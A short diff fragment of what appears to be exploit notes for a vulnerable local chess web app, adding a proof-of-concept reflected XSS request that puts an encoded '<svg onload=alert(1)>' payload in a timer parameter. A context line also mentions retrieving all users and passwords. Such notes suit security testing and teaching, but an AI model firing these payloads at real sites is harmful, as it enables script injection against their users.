@@ -16,3 +16,5 @@ Retrieving all users and passwords:
 
 XSS:	
 <svg onload=alert(1)>
+
+http://192.168.99.100:8081/chess/Timer?player1=kasparov&player2=revuelta&timer=%3Csvg+onload%3Dalert%281%29%3E
